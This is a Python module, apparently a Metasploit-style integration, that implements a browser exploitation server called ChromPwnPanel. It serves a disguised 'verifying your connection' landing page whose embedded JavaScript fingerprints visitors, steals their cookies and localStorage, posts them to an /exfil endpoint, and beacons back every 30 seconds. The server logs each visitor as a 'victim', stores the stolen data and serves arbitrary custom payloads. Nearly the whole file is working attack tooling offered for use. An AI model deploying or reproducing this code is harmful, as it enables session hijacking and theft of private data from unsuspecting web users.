#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ChromPwnPanel Integration

ChromPwnPanel is a browser exploitation server that provides various
browser-based attack capabilities.

Author: P4x-ng
License: MSF_LICENSE
"""

import os
import sys
import json
import socket
import threading
from typing import Dict, List, Optional, Tuple
from http.server import HTTPServer, BaseHTTPRequestHandler

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(__file__)))))

from lib.msf.core.integrations import BaseIntegration, IntegrationRegistry


class ChromPwnHandler(BaseHTTPRequestHandler):
    """HTTP request handler for ChromPwnPanel server."""
    
    # Class variable to store panel instance
    panel = None
    
    def log_message(self, format, *args):
        """Override to control logging."""
        if self.panel and self.panel.verbose:
            print(f"[ChromPwn] {format % args}")
    
    def do_GET(self):
        """Handle GET requests."""
        if self.path == '/':
            self.serve_landing_page()
        elif self.path == '/exploit.js':
            self.serve_exploit_script()
        elif self.path == '/beacon':
            self.handle_beacon()
        elif self.path.startswith('/payload/'):
            self.serve_payload()
        else:
            self.send_error(404)
    
    def do_POST(self):
        """Handle POST requests."""
        if self.path == '/exfil':
            self.handle_exfiltration()
        elif self.path == '/callback':
            self.handle_callback()
        else:
            self.send_error(404)
    
    def serve_landing_page(self):
        """Serve the main landing page."""
        html = self.panel.generate_landing_page()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(html))
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_exploit_script(self):
        """Serve the exploit JavaScript."""
        js = self.panel.generate_exploit_script()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript')
        self.send_header('Content-Length', len(js))
        self.end_headers()
        self.wfile.write(js.encode())
    
    def handle_beacon(self):
        """Handle beacon requests from compromised browsers."""
        client_info = {
            'ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', 'Unknown'),
            'referer': self.headers.get('Referer', 'None')
        }
        
        self.panel.register_victim(client_info)
        
        response = json.dumps({'status': 'ok', 'commands': []})
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response.encode())
    
    def serve_payload(self):
        """Serve custom payload."""
        payload_name = self.path.split('/')[-1]
        payload = self.panel.get_payload(payload_name)
        
        if payload:
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.send_header('Content-Length', len(payload))
            self.end_headers()
            self.wfile.write(payload.encode())
        else:
            self.send_error(404)
    
    def handle_exfiltration(self):
        """Handle exfiltrated data from browser."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data)
            self.panel.store_exfiltrated_data(data)
            
            response = json.dumps({'status': 'received'})
            self.send_response(200)
        except Exception as e:
            response = json.dumps({'status': 'error', 'message': str(e)})
            self.send_response(400)
        
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response.encode())
    
    def handle_callback(self):
        """Handle callback from browser."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data)
            self.panel.process_callback(data)
            
            response = json.dumps({'status': 'ok'})
            self.send_response(200)
        except Exception as e:
            response = json.dumps({'status': 'error', 'message': str(e)})
            self.send_response(400)
        
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response.encode())


class ChromPwnPanelIntegration(BaseIntegration):
    """
    Integration for ChromPwnPanel browser exploitation server.
    
    Features:
    - Browser-based exploitation
    - Cross-site scripting (XSS) delivery
    - Browser fingerprinting
    - Data exfiltration
    - Session hijacking
    - BeEF-like capabilities
    """
    
    def __init__(self, config=None):
        """Initialize ChromPwnPanel integration."""
        super().__init__(config)
        self.name = "ChromPwnPanel"
        
        self.host = self.config.get('host', '0.0.0.0')
        self.port = self.config.get('port', 8080)
        self.verbose = self.config.get('verbose', True)
        
        self.server = None
        self.server_thread = None
        self.victims = []
        self.exfiltrated_data = []
        self.payloads = {}
        
    def check_dependencies(self) -> Tuple[bool, List[str]]:
        """Check ChromPwnPanel dependencies."""
        missing = []
        
        # Check if port is available
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            result = sock.connect_ex((self.host, self.port))
            
            if result == 0:
                missing.append(f'Port {self.port} already in use')
        finally:
            sock.close()
        
        return (len(missing) == 0, missing)
    
    def initialize(self) -> bool:
        """Initialize ChromPwnPanel server."""
        success, missing = self.check_dependencies()
        
        if not success:
            print(f"[!] ChromPwnPanel dependencies missing: {missing}")
            return False
        
        # Set up handler
        ChromPwnHandler.panel = self
        
        self.enabled = True
        print(f"[*] ChromPwnPanel initialized")
        return True
    
    def start_server(self) -> bool:
        """Start the ChromPwnPanel HTTP server."""
        try:
            self.server = HTTPServer((self.host, self.port), ChromPwnHandler)
            
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            print(f"[+] ChromPwnPanel server started on {self.host}:{self.port}")
            print(f"[*] Landing page: http://{self.host}:{self.port}/")
            
            return True
        
        except Exception as e:
            print(f"[!] Failed to start server: {e}")
            return False
    
    def stop_server(self):
        """Stop the ChromPwnPanel server."""
        if self.server:
            self.server.shutdown()
            self.server_thread.join()
            print("[*] ChromPwnPanel server stopped")
    
    def generate_landing_page(self) -> str:
        """Generate the main landing page HTML."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Welcome</title>
    <script src="/exploit.js"></script>
</head>
<body>
    <h1>Welcome</h1>
    <p>Please wait while we verify your connection...</p>
    <script>
        // Auto-load beacon
        setTimeout(function() {
            fetch('/beacon')
                .then(r => r.json())
                .then(d => console.log('Connected'));
        }, 1000);
    </script>
</body>
</html>'''
    
    def generate_exploit_script(self) -> str:
        """Generate the exploit JavaScript."""
        return '''
// ChromPwnPanel Exploit Script
(function() {
    'use strict';
    
    // Browser fingerprinting
    function fingerprint() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        };
    }
    
    // Send beacon
    function beacon() {
        fetch('/beacon', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(fingerprint())
        });
    }
    
    // Exfiltrate data
    function exfiltrate(data) {
        fetch('/exfil', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                timestamp: Date.now(),
                data: data
            })
        });
    }
    
    // Try to grab cookies
    if (document.cookie) {
        exfiltrate({type: 'cookies', value: document.cookie});
    }
    
    // Try to grab localStorage
    if (window.localStorage) {
        exfiltrate({type: 'localStorage', value: localStorage});
    }
    
    // Send beacon every 30 seconds
    setInterval(beacon, 30000);
    beacon();
    
})();
'''
    
    def register_victim(self, info: Dict):
        """Register a new victim."""
        victim = {
            'ip': info['ip'],
            'user_agent': info['user_agent'],
            'first_seen': info.get('timestamp'),
            'last_seen': info.get('timestamp')
        }
        
        # Check if already registered
        for v in self.victims:
            if v['ip'] == victim['ip']:
                v['last_seen'] = victim['last_seen']
                return
        
        self.victims.append(victim)
        print(f"[+] New victim: {victim['ip']} ({victim['user_agent']})")
    
    def store_exfiltrated_data(self, data: Dict):
        """Store exfiltrated data."""
        self.exfiltrated_data.append(data)
        print(f"[+] Exfiltrated data: {data.get('type', 'unknown')}")
    
    def process_callback(self, data: Dict):
        """Process callback from browser."""
        print(f"[*] Callback received: {data}")
    
    def add_payload(self, name: str, code: str):
        """Add a custom payload."""
        self.payloads[name] = code
        print(f"[+] Added payload: {name}")
    
    def get_payload(self, name: str) -> Optional[str]:
        """Get a payload by name."""
        return self.payloads.get(name)
    
    def list_victims(self) -> List[Dict]:
        """List all registered victims."""
        return self.victims
    
    def get_exfiltrated_data(self) -> List[Dict]:
        """Get all exfiltrated data."""
        return self.exfiltrated_data
    
    def execute(self, action: str, **kwargs) -> Dict:
        """Execute ChromPwnPanel action."""
        if not self.enabled:
            return {'success': False, 'error': 'ChromPwnPanel not initialized'}
        
        if action == 'start':
            success = self.start_server()
            return {'success': success}
        
        elif action == 'stop':
            self.stop_server()
            return {'success': True}
        
        elif action == 'list_victims':
            return {
                'success': True,
                'victims': self.list_victims()
            }
        
        elif action == 'get_data':
            return {
                'success': True,
                'data': self.get_exfiltrated_data()
            }
        
        elif action == 'add_payload':
            self.add_payload(kwargs['name'], kwargs['code'])
            return {'success': True}
        
        return {'success': False, 'error': f'Unknown action: {action}'}
    
    def cleanup(self):
        """Clean up ChromPwnPanel resources."""
        self.stop_server()
        self.enabled = False


# Register the integration
IntegrationRegistry.register('chrompwn', ChromPwnPanelIntegration)


if __name__ == '__main__':
    # Test the integration
    panel = ChromPwnPanelIntegration({'port': 8888})
    
    if panel.initialize():
        print("[*] ChromPwnPanel initialized")
        
        # Start server
        result = panel.execute('start')
        
        if result['success']:
            print("[*] Server started. Press Ctrl+C to stop...")
            
            try:
                import time
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Stopping server...")
                panel.cleanup()
